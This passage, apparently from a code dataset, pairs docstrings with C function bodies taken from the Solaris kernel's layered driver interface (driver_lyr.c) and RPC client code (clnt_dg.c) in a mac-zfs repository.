getmajor(stp->sd_vnode->v_rdev);\n\t\tret = ldi_ident_from_major(major, &li);\n\t}\n\n\tASSERT(ret == 0);\n\t(void) handle_alloc(vp, (struct ldi_ident *)li);\n\tldi_ident_release(li);\n}", "path": "usr\\src\\uts\\common\\os\\driver_lyr.c", "repo_name": "dustin/mac-zfs", "stars": 123, "license": "other", "language": "c", "size": 18896}
{"docstring": "/*\n * i_ldi_prop_op_typed() is a wrapper for i_ldi_prop_op that is used\n * by the typed ldi property lookup interfaces.\n */\n", "func_signal": "static int\ni_ldi_prop_op_typed(dev_t dev, dev_info_t *dip, int flags, char *name,\n    caddr_t *datap, int *lengthp, int elem_size)", "code": "{\n\tcaddr_t\tprop_val;\n\tint\tprop_len, res;\n\n\tASSERT((dip != NULL) && (name != NULL));\n\tASSERT((datap != NULL) && (lengthp != NULL));\n\n\t/*\n\t * first call the drivers prop_op() interface to allow it\n\t * it to override default property values.\n\t */\n\tres = i_ldi_prop_op(dev, dip, PROP_LEN,\n\t    flags | DDI_PROP_DYNAMIC, name, NULL, &prop_len);\n\tif (res != DDI_PROP_SUCCESS)\n\t\treturn (DDI_PROP_NOT_FOUND);\n\n\t/* sanity check the property length */\n\tif (prop_len == 0) {\n\t\t/*\n\t\t * the ddi typed interfaces don't allow a drivers to\n\t\t * create properties with a length of 0.  so we should\n\t\t * prevent drivers from returning 0 length dynamic\n\t\t * properties for typed property lookups.\n\t\t */\n\t\treturn (DDI_PROP_NOT_FOUND);\n\t}\n\n\t/* sanity check the property length against the element size */\n\tif (elem_size && ((prop_len % elem_size) != 0))\n\t\treturn (DDI_PROP_NOT_FOUND);\n\n\t/*\n\t * got it.  now allocate a prop_driver_data struct so that the\n\t * user can free the property via ddi_prop_free().\n\t */\n\tprop_val = i_ldi_prop_op_alloc(prop_len);\n\n\t/* lookup the property again, this time get the value */\n\tres = i_ldi_prop_op(dev, dip, PROP_LEN_AND_VAL_BUF,\n\t    flags | DDI_PROP_DYNAMIC, name, prop_val, &prop_len);\n\tif (res != DDI_PROP_SUCCESS) {\n\t\tddi_prop_free(prop_val);\n\t\treturn (DDI_PROP_NOT_FOUND);\n\t}\n\n\t/* sanity check the property length */\n\tif (prop_len == 0) {\n\t\tddi_prop_free(prop_val);\n\t\treturn (DDI_PROP_NOT_FOUND);\n\t}\n\n\t/* sanity check the property length against the element size */\n\tif (elem_size && ((prop_len % elem_size) != 0)) {\n\t\tddi_prop_free(prop_val);\n\t\treturn (DDI_PROP_NOT_FOUND);\n\t}\n\n\t/*\n\t * return the prop_driver_data struct and, optionally, the length\n\t * of the data.\n\t */\n\t*datap = prop_val;\n\t*lengthp = prop_len;\n\n\treturn (DDI_PROP_SUCCESS);\n}", "path": "usr\\src\\uts\\common\\os\\driver_lyr.c", "repo_name": "dustin/mac-zfs", "stars": 123, "license": "other", "language": "c", "size": 18896}
{"docstring": "/*\n * Here are some definitions of terms used in the following LDI events\n * code:\n *\n * \"LDI events\" AKA \"native events\": These are events defined by the\n * \"new\" LDI event framework. These events are serviced by the LDI event\n * framework itself and thus are native to it.\n *\n * \"LDI contract events\": These are contract events that correspond to the\n *  LDI events. This mapping of LDI events to contract events is defined by\n * the ldi_ev_cookies[] array above.\n *\n * NDI events: These are events which are serviced by the NDI event subsystem.\n * LDI subsystem just provides a thin wrapper around the NDI event interfaces\n * These events are thereefore *not* native events.\n */\n", "func_signal": "static int\nldi_native_event(const char *evname)", "code": "{\n\tint i;\n\n\tLDI_EVTRC((CE_NOTE, \"ldi_native_event: entered: ev=%s\", evname));\n\n\tfor (i = 0; ldi_ev_cookies[i].ck_evname != NULL; i++) {\n\t\tif (strcmp(ldi_ev_cookies[i].ck_evname, evname) == 0)\n\t\t\treturn (1);\n\t}\n\n\treturn (0);\n}", "path": "usr\\src\\uts\\common\\os\\driver_lyr.c", "repo_name": "dustin/mac-zfs", "stars": 123, "license": "other", "language": "c", "size": 18896}
{"docstring": "/*\n * i_pack_string_array takes a a string array property that is represented\n * as a concatination of strings (with the NULL character included for\n * each string) and converts it into a format that can be returned by\n * ldi_prop_lookup_string_array.\n */\n", "func_signal": "static int\ni_pack_string_array(char *str_concat, int prop_len,\n    char ***str_arrayp, int *nelemp)", "code": "{\n\tint i, nelem, pack_size;\n\tchar **str_array, *strptr;\n\n\t/*\n\t * first we need to sanity check the input string array.\n\t * in essence this can be done my making sure that the last\n\t * character of the array passed in is null.  (meaning the last\n\t * string in the array is NULL terminated.\n\t */\n\tif (str_concat[prop_len - 1] != '\\0')\n\t\treturn (1);\n\n\t/* now let's count the number of strings in the array */\n\tfor (nelem = i = 0; i < prop_len; i++)\n\t\tif (str_concat[i] == '\\0')\n\t\t\tnelem++;\n\tASSERT(nelem >= 1);\n\n\t/* now let's allocate memory for the new packed property */\n\tpack_size = (sizeof (char *) * (nelem + 1)) + prop_len;\n\tstr_array = (char **)i_ldi_prop_op_alloc(pack_size);\n\n\t/* let's copy the actual string data into the new property */\n\tstrptr = (char *)&(str_array[nelem + 1]);\n\tbcopy(str_concat, strptr, prop_len);\n\n\t/* now initialize the string array pointers */\n\tfor (i = 0; i < nelem; i++) {\n\t\tstr_array[i] = strptr;\n\t\tstrptr += strlen(strptr) + 1;\n\t}\n\tstr_array[nelem] = NULL;\n\n\t/* set the return values */\n\t*str_arrayp = str_array;\n\t*nelemp = nelem;\n\n\treturn (0);\n}", "path": "usr\\src\\uts\\common\\os\\driver_lyr.c", "repo_name": "dustin/mac-zfs", "stars": 123, "license": "other", "language": "c", "size": 18896}
{"docstring": "/*\n * LDI Consolidation private interfaces\n */\n", "func_signal": "int\nldi_ident_from_mod(struct modlinkage *modlp, ldi_ident_t *lip)", "code": "{\n\tstruct modctl\t\t*modp;\n\tmajor_t\t\t\tmajor;\n\tchar\t\t\t*name;\n\n\tif ((modlp == NULL) || (lip == NULL))\n\t\treturn (EINVAL);\n\n\tASSERT(!servicing_interrupt());\n\n\tmodp = mod_getctl(modlp);\n\tif (modp == NULL)\n\t\treturn (EINVAL);\n\tname = modp->mod_modname;\n\tif (name == NULL)\n\t\treturn (EINVAL);\n\tmajor = mod_name_to_major(name);\n\n\t*lip = (ldi_ident_t)ident_alloc(name, NULL, DDI_DEV_T_NONE, major);\n\n\tLDI_ALLOCFREE((CE_WARN, \"%s: li=0x%p, mod=%s\",\n\t    \"ldi_ident_from_mod\", (void *)*lip, name));\n\n\treturn (0);\n}", "path": "usr\\src\\uts\\common\\os\\driver_lyr.c", "repo_name": "dustin/mac-zfs", "stars": 123, "license": "other", "language": "c", "size": 18896}
{"docstring": "/* get a vnode to a device by dev_t and otyp */\n", "func_signal": "static int\nldi_vp_from_dev(dev_t dev, int otyp, vnode_t **vpp)", "code": "{\n\tdev_info_t\t\t*dip;\n\tvnode_t\t\t\t*vp;\n\n\t/* sanity check required input parameters */\n\tif ((dev == DDI_DEV_T_NONE) || (!OTYP_VALID(otyp)) || (vpp == NULL))\n\t\treturn (EINVAL);\n\n\tif ((dip = e_ddi_hold_devi_by_dev(dev, 0)) == NULL)\n\t\treturn (ENODEV);\n\n\tif (STREAMSTAB(getmajor(dev)) && (otyp != OTYP_CHR)) {\n\t\tddi_release_devi(dip);  /* from e_ddi_hold_devi_by_dev */\n\t\treturn (ENXIO);\n\t}\n\n\tvp = makespecvp(dev, OTYP_TO_VTYP(otyp));\n\tspec_assoc_vp_with_devi(vp, dip);\n\tddi_release_devi(dip);  /* from e_ddi_hold_devi_by_dev */\n\n\t*vpp = vp;\n\treturn (0);\n}", "path": "usr\\src\\uts\\common\\os\\driver_lyr.c", "repo_name": "dustin/mac-zfs", "stars": 123, "license": "other", "language": "c", "size": 18896}
{"docstring": "/*\n * Make sure that the time is not garbage.  -1 value is allowed.\n */\n", "func_signal": "static bool_t\ntime_not_ok(struct timeval *t)", "code": "{\n\treturn (t->tv_sec < -1 || t->tv_sec > 100000000 ||\n\t\tt->tv_usec < -1 || t->tv_usec > 1000000);\n}", "path": "usr\\src\\lib\\libnsl\\rpc\\clnt_dg.c", "repo_name": "dustin/mac-zfs", "stars": 123, "license": "other", "language": "c", "size": 18896}
{"docstring": "/*\n * Framework function to be called from a layered driver to propagate\n * LDI \"finalize\" events to exported minors.\n *\n * This function is a public interface exported by the LDI framework\n * for use by layered drivers to propagate device events up the software\n * stack.\n */\n", "func_signal": "void\nldi_ev_finalize(dev_info_t *dip, minor_t minor, int spec_type, int ldi_result,\n    ldi_ev_cookie_t cookie, void *ev_data)", "code": "{\n\tdev_t dev;\n\tmajor_t major;\n\tchar *evname;\n\tint ct_result = (ldi_result == LDI_EV_SUCCESS) ?\n\t    CT_EV_SUCCESS : CT_EV_FAILURE;\n\tuint_t ct_evtype;\n\n\tASSERT(dip);\n\tASSERT(spec_type == S_IFBLK || spec_type == S_IFCHR);\n\tASSERT(ldi_result == LDI_EV_SUCCESS || ldi_result == LDI_EV_FAILURE);\n\tASSERT(ldi_native_cookie(cookie));\n\n\tLDI_EVDBG((CE_NOTE, \"ldi_ev_finalize: entered: dip=%p\", (void *)dip));\n\n\tmajor = ddi_driver_major(dip);\n\tif (major == (major_t)-1) {\n\t\tchar *path = kmem_alloc(MAXPATHLEN, KM_SLEEP);\n\t\t(void) ddi_pathname(dip, path);\n\t\tcmn_err(CE_WARN, \"ldi_ev_finalize: cannot derive major number \"\n\t\t    \"for device %s\", path);\n\t\tkmem_free(path, MAXPATHLEN);\n\t\treturn;\n\t}\n\tdev = makedevice(major, minor);\n\n\tevname = ldi_ev_get_type(cookie);\n\n\tLDI_EVDBG((CE_NOTE, \"ldi_ev_finalize: calling contracts\"));\n\tct_evtype = ldi_contract_event(evname);\n\tcontract_device_finalize(dip, dev, spec_type, ct_evtype, ct_result);\n\n\tLDI_EVDBG((CE_NOTE, \"ldi_ev_finalize: calling ldi_invoke_finalize\"));\n\tldi_invoke_finalize(dip, dev, spec_type, evname, ldi_result, ev_data);\n}", "path": "usr\\src\\uts\\common\\os\\driver_lyr.c", "repo_name": "dustin/mac-zfs", "stars": 123, "license": "other", "language": "c", "size": 18896}
{"docstring": "/*\n * Receive a unit data error indication.\n * Below even when t_alloc() fails we pass uderr=NULL to t_rcvuderr()\n * so as to just clear the error indication.\n */\n", "func_signal": "static int\n_rcv_unitdata_err(struct cu_data *cu)", "code": "{\n\tint old;\n\tstruct t_uderr *uderr;\n\n\told = t_errno;\n\t/* LINTED pointer cast */\n\tuderr = (struct t_uderr *)\n\t\tt_alloc(cu->cu_fd, T_UDERROR, T_ADDR);\n\n\tif (t_rcvuderr(cu->cu_fd, uderr) == 0) {\n\t\tif (uderr == NULL)\n\t\t\treturn (0);\n\n\t\tif (uderr->addr.len != cu->cu_raddr.len ||\n\t\t    (memcmp(uderr->addr.buf, cu->cu_raddr.buf,\n\t\t    cu->cu_raddr.len))) {\n\t\t\t(void) t_free((char *)uderr, T_UDERROR);\n\t\t\treturn (0);\n\t\t}\n\t\trpc_callerr.re_errno = uderr->error;\n\t\trpc_callerr.re_terrno = TSYSERR;\n\t\t(void) t_free((char *)uderr, T_UDERROR);\n\t\treturn (1);\n\t}\n\trpc_callerr.re_terrno = old;\n\tif (uderr)\n\t\t(void) t_free((char *)uderr, T_UDERROR);\n\treturn (-1);\n}", "path": "usr\\src\\lib\\libnsl\\rpc\\clnt_dg.c", "repo_name": "dustin/mac-zfs", "stars": 123, "license": "other", "language": "c", "size": 18896}
{"docstring": "/*\n * LDI ident manipulation functions\n */\n", "func_signal": "static uint_t\nident_hash_func(modid_t modid, dev_info_t *dip, dev_t dev)", "code": "{\n\tif (dip != NULL) {\n\t\tuintptr_t k = (uintptr_t)dip;\n\t\tk >>= (int)highbit(sizeof (struct dev_info));\n\t\treturn ((uint_t)k);\n\t} else if (dev != DDI_DEV_T_NONE) {\n\t\treturn (modid + getminor(dev) + getmajor(dev));\n\t} else {\n\t\treturn (modid);\n\t}\n}", "path": "usr\\src\\uts\\common\\os\\driver_lyr.c", "repo_name": "dustin/mac-zfs", "stars": 123, "license": "other", "language": "c", "size": 18896}
{"docstring": "/*\n * LDI event manipulation functions\n */\n", "func_signal": "static void\nhandle_event_add(ldi_event_t *lep)", "code": "{\n\tstruct ldi_handle *lhp = lep->le_lhp;\n\n\tASSERT(lhp != NULL);\n\n\tmutex_enter(lhp->lh_lock);\n\tif (lhp->lh_events == NULL) {\n\t\tlhp->lh_events = lep;\n\t\tmutex_exit(lhp->lh_lock);\n\t\treturn;\n\t}\n\n\tlep->le_next = lhp->lh_events;\n\tlhp->lh_events->le_prev = lep;\n\tlhp->lh_events = lep;\n\tmutex_exit(lhp->lh_lock);\n}", "path": "usr\\src\\uts\\common\\os\\driver_lyr.c", "repo_name": "dustin/mac-zfs", "stars": 123, "license": "other", "language": "c", "size": 18896}
{"docstring": "/*\n * ldi_usage_walker() - this walker reports LDI kernel device usage\n * information via the callback() callback function.  the LDI keeps track\n * of what devices are being accessed in its own internal data structures.\n * this function walks those data structures to determine device usage.\n */\n", "func_signal": "void\nldi_usage_walker(void *arg, int (*callback)(const ldi_usage_t *, void *))", "code": "{\n\tstruct ldi_handle\t*lhp;\n\tstruct ldi_ident\t*lip;\n\tvnode_t\t\t\t*vp;\n\tint\t\t\ti;\n\tint\t\t\tret = LDI_USAGE_CONTINUE;\n\n\tfor (i = 0; i < LH_HASH_SZ; i++) {\n\t\tmutex_enter(&ldi_handle_hash_lock[i]);\n\n\t\tlhp = ldi_handle_hash[i];\n\t\twhile ((lhp != NULL) && (ret == LDI_USAGE_CONTINUE)) {\n\t\t\tlip = lhp->lh_ident;\n\t\t\tvp = lhp->lh_vp;\n\n\t\t\t/* invoke the devinfo callback function */\n\t\t\tret = ldi_usage_walker_helper(lip, vp, arg, callback);\n\n\t\t\tlhp = lhp->lh_next;\n\t\t}\n\t\tmutex_exit(&ldi_handle_hash_lock[i]);\n\n\t\tif (ret != LDI_USAGE_CONTINUE)\n\t\t\tbreak;\n\t}\n}", "path": "usr\\src\\uts\\common\\os\\driver_lyr.c", "repo_name": "dustin/mac-zfs", "stars": 123, "license": "other", "language": "c", "size": 18896}
{"docstring": "/* get a handle to a device by dev_t and otyp */\n", "func_signal": "int\nldi_open_by_dev(dev_t *devp, int otyp, int flag, cred_t *cr,\n    ldi_handle_t *lhp, ldi_ident_t li)", "code": "{\n\tstruct ldi_ident\t*lip = (struct ldi_ident *)li;\n\tint\t\t\tret;\n\tvnode_t\t\t\t*vp;\n\n\t/* sanity check required input parameters */\n\tif ((devp == NULL) || (!OTYP_VALID(otyp)) || (cr == NULL) ||\n\t    (lhp == NULL) || (lip == NULL))\n\t\treturn (EINVAL);\n\n\tASSERT(!servicing_interrupt());\n\n\tif ((ret = ldi_vp_from_dev(*devp, otyp, &vp)) != 0)\n\t\treturn (ret);\n\n\tif ((ret = ldi_open_by_vp(&vp, flag, cr, lhp, lip)) == 0) {\n\t\t*devp = vp->v_rdev;\n\t}\n\tVN_RELE(vp);\n\n\treturn (ret);\n}", "path": "usr\\src\\uts\\common\\os\\driver_lyr.c", "repo_name": "dustin/mac-zfs", "stars": 123, "license": "other", "language": "c", "size": 18896}
{"docstring": "/*\n * Framework function to be called from a layered driver to propagate\n * LDI \"notify\" events to exported minors.\n *\n * This function is a public interface exported by the LDI framework\n * for use by layered drivers to propagate device events up the software\n * stack.\n */\n", "func_signal": "int\nldi_ev_notify(dev_info_t *dip, minor_t minor, int spec_type,\n    ldi_ev_cookie_t cookie, void *ev_data)", "code": "{\n\tchar\t\t*evname = ldi_ev_get_type(cookie);\n\tuint_t\t\tct_evtype;\n\tdev_t\t\tdev;\n\tmajor_t\t\tmajor;\n\tint\t\tretc;\n\tint\t\tretl;\n\n\tASSERT(spec_type == S_IFBLK || spec_type == S_IFCHR);\n\tASSERT(dip);\n\tASSERT(ldi_native_cookie(cookie));\n\n\tLDI_EVDBG((CE_NOTE, \"ldi_ev_notify(): entered: event=%s, dip=%p\",\n\t    evname, (void *)dip));\n\n\tif (!ldi_ev_sync_event(evname)) {\n\t\tcmn_err(CE_PANIC, \"ldi_ev_notify(): %s not a \"\n\t\t    \"negotiatable event\", evname);\n\t\treturn (LDI_EV_SUCCESS);\n\t}\n\n\tmajor = ddi_driver_major(dip);\n\tif (major == (major_t)-1) {\n\t\tchar *path = kmem_alloc(MAXPATHLEN, KM_SLEEP);\n\t\t(void) ddi_pathname(dip, path);\n\t\tcmn_err(CE_WARN, \"ldi_ev_notify: cannot derive major number \"\n\t\t    \"for device %s\", path);\n\t\tkmem_free(path, MAXPATHLEN);\n\t\treturn (LDI_EV_FAILURE);\n\t}\n\tdev = makedevice(major, minor);\n\n\t/*\n\t * Generate negotiation contract events on contracts (if any) associated\n\t * with this minor.\n\t */\n\tLDI_EVDBG((CE_NOTE, \"ldi_ev_notify(): calling contract nego.\"));\n\tct_evtype = ldi_contract_event(evname);\n\tretc = contract_device_negotiate(dip, dev, spec_type, ct_evtype);\n\tif (retc == CT_NACK) {\n\t\tLDI_EVDBG((CE_NOTE, \"ldi_ev_notify(): contract neg. NACK\"));\n\t\treturn (LDI_EV_FAILURE);\n\t}\n\n\tLDI_EVDBG((CE_NOTE, \"ldi_ev_notify(): LDI invoke notify\"));\n\tretl = ldi_invoke_notify(dip, dev, spec_type, evname, ev_data);\n\tif (retl == LDI_EV_FAILURE) {\n\t\tLDI_EVDBG((CE_NOTE, \"ldi_ev_notify(): ldi_invoke_notify \"\n\t\t    \"returned FAILURE. Calling contract negend\"));\n\t\tcontract_device_negend(dip, dev, spec_type, CT_EV_FAILURE);\n\t\treturn (LDI_EV_FAILURE);\n\t}\n\n\t/*\n\t * The very fact that we are here indicates that there is a\n\t * LDI callback (and hence a constraint) for the retire of the\n\t * HW device. So we just return success even if there are no\n\t * contracts or LDI callbacks against the minors layered on top\n\t * of the HW minors\n\t */\n\tLDI_EVDBG((CE_NOTE, \"ldi_ev_notify(): returning SUCCESS\"));\n\treturn (LDI_EV_SUCCESS);\n}", "path": "usr\\src\\uts\\common\\os\\driver_lyr.c", "repo_name": "dustin/mac-zfs", "stars": 123, "license": "other", "language": "c", "size": 18896}
{"docstring": "/* get a handle to a device by pathname */\n", "func_signal": "int\nldi_open_by_name(char *pathname, int flag, cred_t *cr,\n    ldi_handle_t *lhp, ldi_ident_t li)", "code": "{\n\tstruct ldi_ident\t*lip = (struct ldi_ident *)li;\n\tint\t\t\tret;\n\tvnode_t\t\t\t*vp;\n\n\t/* sanity check required input parameters */\n\tif ((pathname == NULL) || (*pathname != '/') ||\n\t    (cr == NULL) || (lhp == NULL) || (lip == NULL))\n\t\treturn (EINVAL);\n\n\tASSERT(!servicing_interrupt());\n\n\tif ((ret = ldi_vp_from_name(pathname, &vp)) != 0)\n\t\treturn (ret);\n\n\tret = ldi_open_by_vp(&vp, flag, cr, lhp, lip);\n\tVN_RELE(vp);\n\n\treturn (ret);\n}", "path": "usr\\src\\uts\\common\\os\\driver_lyr.c", "repo_name": "dustin/mac-zfs", "stars": 123, "license": "other", "language": "c", "size": 18896}
{"docstring": "/* get a handle to a device by devid and minor name */\n", "func_signal": "static int\nldi_vp_from_devid(ddi_devid_t devid, char *minor_name, vnode_t **vpp)", "code": "{\n\tdev_info_t\t\t*dip;\n\tvnode_t\t\t\t*vp;\n\tint\t\t\tret, i, ndevs, styp;\n\tdev_t\t\t\tdev, *devs;\n\n\t/* sanity check required input parameters */\n\tif ((devid == NULL) || (minor_name == NULL) || (vpp == NULL))\n\t\treturn (EINVAL);\n\n\tret = ddi_lyr_devid_to_devlist(devid, minor_name, &ndevs, &devs);\n\tif ((ret != DDI_SUCCESS) || (ndevs <= 0))\n\t\treturn (ENODEV);\n\n\tfor (i = 0; i < ndevs; i++) {\n\t\tdev = devs[i];\n\n\t\tif ((dip = e_ddi_hold_devi_by_dev(dev, 0)) == NULL)\n\t\t\tcontinue;\n\n\t\t/*\n\t\t * now we have to verify that the devid of the disk\n\t\t * still matches what was requested.\n\t\t *\n\t\t * we have to do this because the devid could have\n\t\t * changed between the call to ddi_lyr_devid_to_devlist()\n\t\t * and e_ddi_hold_devi_by_dev().  this is because when\n\t\t * ddi_lyr_devid_to_devlist() returns a list of devts\n\t\t * there is no kind of hold on those devts so a device\n\t\t * could have been replaced out from under us in the\n\t\t * interim.\n\t\t */\n\t\tif ((i_ddi_minorname_to_devtspectype(dip, minor_name,\n\t\t    NULL, &styp) == DDI_SUCCESS) &&\n\t\t    ldi_devid_match(devid, dip, dev))\n\t\t\tbreak;\n\n\t\tddi_release_devi(dip);\t/* from e_ddi_hold_devi_by_dev() */\n\t}\n\n\tddi_lyr_free_devlist(devs, ndevs);\n\n\tif (i == ndevs)\n\t\treturn (ENODEV);\n\n\tASSERT(STYP_VALID(styp));\n\tvp = makespecvp(dev, STYP_TO_VTYP(styp));\n\tspec_assoc_vp_with_devi(vp, dip);\n\tddi_release_devi(dip);\t\t/* from e_ddi_hold_devi_by_dev */\n\n\t*vpp = vp;\n\treturn (0);\n}", "path": "usr\\src\\uts\\common\\os\\driver_lyr.c", "repo_name": "dustin/mac-zfs", "stars": 123, "license": "other", "language": "c", "size": 18896}
{"docstring": "/* get a vnode to a device by pathname */\n", "func_signal": "static int\nldi_vp_from_name(char *path, vnode_t **vpp)", "code": "{\n\tvnode_t\t\t\t*vp = NULL;\n\tint\t\t\tret;\n\n\t/* sanity check required input parameters */\n\tif ((path == NULL) || (vpp == NULL))\n\t\treturn (EINVAL);\n\n\tif (modrootloaded) {\n\t\tcred_t *saved_cred = curthread->t_cred;\n\n\t\t/* we don't want lookupname to fail because of credentials */\n\t\tcurthread->t_cred = kcred;\n\n\t\t/*\n\t\t * all lookups should be done in the global zone.  but\n\t\t * lookupnameat() won't actually do this if an absolute\n\t\t * path is passed in.  since the ldi interfaces require an\n\t\t * absolute path we pass lookupnameat() a pointer to\n\t\t * the character after the leading '/' and tell it to\n\t\t * start searching at the current system root directory.\n\t\t */\n\t\tASSERT(*path == '/');\n\t\tret = lookupnameat(path + 1, UIO_SYSSPACE, FOLLOW, NULLVPP,\n\t\t    &vp, rootdir);\n\n\t\t/* restore this threads credentials */\n\t\tcurthread->t_cred = saved_cred;\n\n\t\tif (ret == 0) {\n\t\t\tif (!vn_matchops(vp, spec_getvnodeops()) ||\n\t\t\t    !VTYP_VALID(vp->v_type)) {\n\t\t\t\tVN_RELE(vp);\n\t\t\t\treturn (ENXIO);\n\t\t\t}\n\t\t}\n\t}\n\n\tif (vp == NULL) {\n\t\tdev_info_t\t*dip;\n\t\tdev_t\t\tdev;\n\t\tint\t\tspec_type;\n\n\t\t/*\n\t\t * Root is not mounted, the minor node is not specified,\n\t\t * or an OBP path has been specified.\n\t\t */\n\n\t\t/*\n\t\t * Determine if path can be pruned to produce an\n\t\t * OBP or devfs path for resolve_pathname.\n\t\t */\n\t\tif (strncmp(path, \"/devices/\", 9) == 0)\n\t\t\tpath += strlen(\"/devices\");\n\n\t\t/*\n\t\t * if no minor node was specified the DEFAULT minor node\n\t\t * will be returned.  if there is no DEFAULT minor node\n\t\t * one will be fabricated of type S_IFCHR with the minor\n\t\t * number equal to the instance number.\n\t\t */\n\t\tret = resolve_pathname(path, &dip, &dev, &spec_type);\n\t\tif (ret != 0)\n\t\t\treturn (ENODEV);\n\n\t\tASSERT(STYP_VALID(spec_type));\n\t\tvp = makespecvp(dev, STYP_TO_VTYP(spec_type));\n\t\tspec_assoc_vp_with_devi(vp, dip);\n\t\tddi_release_devi(dip);\n\t}\n\n\t*vpp = vp;\n\treturn (0);\n}", "path": "usr\\src\\uts\\common\\os\\driver_lyr.c", "repo_name": "dustin/mac-zfs", "stars": 123, "license": "other", "language": "c", "size": 18896}
{"docstring": "/*\n * LDI framework function to invoke \"finalize\" callbacks for all layered\n * drivers that have registered callbacks for that event.\n *\n * This function is *not* to be called by layered drivers. It is for I/O\n * framework code in Solaris, such as the I/O retire code and DR code\n * to call while servicing a device event such as offline or degraded.\n */\n", "func_signal": "void\nldi_invoke_finalize(dev_info_t *dip, dev_t dev, int spec_type, char *event,\n    int ldi_result, void *ev_data)", "code": "{\n\tldi_ev_callback_impl_t *lecp;\n\tlist_t\t*listp;\n\tchar\t*lec_event;\n\tint\tfound = 0;\n\n\tASSERT(dip);\n\tASSERT(dev != DDI_DEV_T_NONE);\n\tASSERT(dev != NODEV);\n\tASSERT((dev == DDI_DEV_T_ANY && spec_type == 0) ||\n\t    (spec_type == S_IFCHR || spec_type == S_IFBLK));\n\tASSERT(event);\n\tASSERT(ldi_native_event(event));\n\tASSERT(ldi_result == LDI_EV_SUCCESS || ldi_result == LDI_EV_FAILURE);\n\n\tLDI_EVDBG((CE_NOTE, \"ldi_invoke_finalize(): entered: dip=%p, result=%d\"\n\t    \" event=%s\", (void *)dip, ldi_result, event));\n\n\tldi_ev_lock();\n\tlistp = &ldi_ev_callback_list.le_head;\n\tfor (lecp = list_head(listp); lecp; lecp = list_next(listp, lecp)) {\n\n\t\tif (lecp->lec_finalize == NULL) {\n\t\t\tLDI_EVDBG((CE_NOTE, \"ldi_invoke_finalize(): No \"\n\t\t\t    \"finalize. Skipping\"));\n\t\t\tcontinue;\t/* Not interested in finalize */\n\t\t}\n\n\t\t/*\n\t\t * Check if matching device\n\t\t */\n\t\tif (!ldi_ev_device_match(lecp, dip, dev, spec_type))\n\t\t\tcontinue;\n\n\t\t/*\n\t\t * It is valid for the LDI handle to be NULL during finalize.\n\t\t * The layered driver may have done an LDI close in the notify\n\t\t * callback.\n\t\t */\n\n\t\t/*\n\t\t * Check if matching event\n\t\t */\n\t\tlec_event = ldi_ev_get_type(lecp->lec_cookie);\n\t\tif (strcmp(event, lec_event) != 0) {\n\t\t\tLDI_EVDBG((CE_NOTE, \"ldi_invoke_finalize(): Not \"\n\t\t\t    \"matching event {%s,%s}. Skipping\",\n\t\t\t    event, lec_event));\n\t\t\tcontinue;\n\t\t}\n\n\t\tLDI_EVDBG((CE_NOTE, \"ldi_invoke_finalize(): calling finalize\"));\n\n\t\tfound = 1;\n\n\t\tlecp->lec_finalize(lecp->lec_lhp, lecp->lec_cookie,\n\t\t    ldi_result, lecp->lec_arg, ev_data);\n\n\t\t/*\n\t\t * If LDI native event and LDI handle closed in context\n\t\t * of notify, NULL out the finalize callback as we have\n\t\t * already called the 1 finalize above allowed in this situation\n\t\t */\n\t\tif (lecp->lec_lhp == NULL &&\n\t\t    ldi_native_cookie(lecp->lec_cookie)) {\n\t\t\tLDI_EVDBG((CE_NOTE,\n\t\t\t    \"ldi_invoke_finalize(): NULLing finalize after \"\n\t\t\t    \"calling 1 finalize following ldi_close\"));\n\t\t\tlecp->lec_finalize = NULL;\n\t\t}\n\t}\n\tldi_ev_unlock();\n\n\tif (found)\n\t\treturn;\n\n\tLDI_EVDBG((CE_NOTE, \"ldi_invoke_finalize(): no matching callbacks\"));\n}", "path": "usr\\src\\uts\\common\\os\\driver_lyr.c", "repo_name": "dustin/mac-zfs", "stars": 123, "license": "other", "language": "c", "size": 18896}
{"docstring": "/*ARGSUSED*/\n", "func_signal": "static void\ni_ldi_ev_callback(dev_info_t *dip, ddi_eventcookie_t event_cookie,\n    void *arg, void *ev_data)", "code": "{\n\tldi_ev_callback_impl_t *lecp = (ldi_ev_callback_impl_t *)arg;\n\n\tASSERT(lecp != NULL);\n\tASSERT(!ldi_native_cookie(lecp->lec_cookie));\n\tASSERT(lecp->lec_lhp);\n\tASSERT(lecp->lec_notify == NULL);\n\tASSERT(lecp->lec_finalize);\n\n\tLDI_EVDBG((CE_NOTE, \"i_ldi_ev_callback: ldh=%p, cookie=%p, arg=%p, \"\n\t    \"ev_data=%p\", (void *)lecp->lec_lhp, (void *)event_cookie,\n\t    (void *)lecp->lec_arg, (void *)ev_data));\n\n\tlecp->lec_finalize(lecp->lec_lhp, (ldi_ev_cookie_t)event_cookie,\n\t    lecp->lec_arg, ev_data);\n}", "path": "usr\\src\\uts\\common\\os\\driver_lyr.c", "repo_name": "dustin/mac-zfs", "stars": 123, "license": "other", "language": "c", "size": 18896}
{"docstring": "/* given a vnode, open a device */\n", "func_signal": "static int\nldi_open_by_vp(vnode_t **vpp, int flag, cred_t *cr,\n    ldi_handle_t *lhp, struct ldi_ident *li)", "code": "{\n\tstruct ldi_handle\t*nlhp;\n\tvnode_t\t\t\t*vp;\n\tint\t\t\terr;\n\n\tASSERT((vpp != NULL) && (*vpp != NULL));\n\tASSERT((lhp != NULL) && (li != NULL));\n\n\tvp = *vpp;\n\t/* if the vnode passed in is not a device, then bail */\n\tif (!vn_matchops(vp, spec_getvnodeops()) || !VTYP_VALID(vp->v_type))\n\t\treturn (ENXIO);\n\n\t/*\n\t * the caller may have specified a node that\n\t * doesn't have cb_ops defined.  the ldi doesn't yet\n\t * support opening devices without a valid cb_ops.\n\t */\n\tif (devopsp[getmajor(vp->v_rdev)]->devo_cb_ops == NULL)\n\t\treturn (ENXIO);\n\n\t/* open the device */\n\tif ((err = VOP_OPEN(&vp, flag | FKLYR, cr)) != 0)\n\t\treturn (err);\n\n\t/* possible clone open, make sure that we still have a spec node */\n\tASSERT(vn_matchops(vp, spec_getvnodeops()));\n\n\tnlhp = handle_alloc(vp, li);\n\n\tif (vp != *vpp) {\n\t\t/*\n\t\t * allocating the layered handle took a new hold on the vnode\n\t\t * so we can release the hold that was returned by the clone\n\t\t * open\n\t\t */\n\t\tLDI_OPENCLOSE((CE_WARN, \"%s: lh=0x%p\",\n\t\t    \"ldi clone open\", (void *)nlhp));\n\t} else {\n\t\tLDI_OPENCLOSE((CE_WARN, \"%s: lh=0x%p\",\n\t\t    \"ldi open\", (void *)nlhp));\n\t}\n\n\t/* Flush back any dirty pages associated with the device. */\n\tif (nlhp->lh_type & LH_CBDEV) {\n\t\tvnode_t\t*cvp = 